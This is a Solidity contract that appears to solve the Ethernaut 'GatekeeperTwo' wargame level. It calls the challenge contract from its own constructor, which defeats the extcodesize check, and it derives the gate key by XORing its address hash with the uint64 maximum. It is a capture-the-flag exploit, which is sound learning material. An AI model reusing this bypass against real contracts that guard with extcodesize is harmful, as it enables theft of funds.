// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PassGatekeeperTwo {
    constructor() {
        address gateKeeperTwo = 0x6cCA88Ba802ED17A054db442E078048856937BC4;
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        (bool success,) = gateKeeperTwo.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
}
